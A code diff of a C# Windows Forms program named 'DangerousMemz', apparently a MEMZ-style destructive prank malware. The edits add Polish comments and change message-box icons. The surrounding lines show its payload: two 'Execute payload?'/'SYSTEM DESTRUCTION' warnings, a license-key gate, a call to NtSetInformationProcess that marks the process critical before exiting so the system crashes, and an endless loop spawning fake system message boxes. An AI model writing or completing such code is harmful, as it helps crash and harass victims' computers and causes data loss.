@@ -24,7 +24,10 @@ namespace DangerousMemz
         [STAThread]
         static void Main()
         {
+            // Pierwsze ostrzeżenie z ikoną ostrzeżenia (Trójkąt)
             if (MessageBox.Show("WARNING: High-risk application.\nContinue?", "CRITICAL", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) != DialogResult.Yes) return;
+            
+            // Drugie ostrzeżenie z ikoną błędu (Czerwony krzyżyk)
             if (MessageBox.Show("FINAL WARNING: Execute payload?", "SYSTEM DESTRUCTION", MessageBoxButtons.YesNo, MessageBoxIcon.Error) != DialogResult.Yes) return;
 
             Application.EnableVisualStyles();
@@ -52,7 +55,8 @@ namespace DangerousMemz
                     int n = 0; NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref n, 4);
                     Environment.Exit(0);
                 } else {
-                    MessageBox.Show("Invalid License Key!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    // Ikona błędu przy złym kluczu
+                    MessageBox.Show("Invalid License Key!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                 }
             };
 
@@ -100,7 +104,8 @@ namespace DangerousMemz
                 Random r = new Random();
                 while(true) {
                     Thread.Sleep(r.Next(3000, 6000));
-                    new Thread(() => MessageBox.Show(msgs[r.Next(msgs.Length)], "System", MessageBoxButtons.OK, MessageBoxIcon.Critical)).Start();
+                    // Dynamiczne okienka z ikoną Critical (X)
+                    new Thread(() => MessageBox.Show(msgs[r.Next(msgs.Length)], "System", MessageBoxButtons.OK, MessageBoxIcon.Stop)).Start();
                 }
             });
             msgThread.Start();
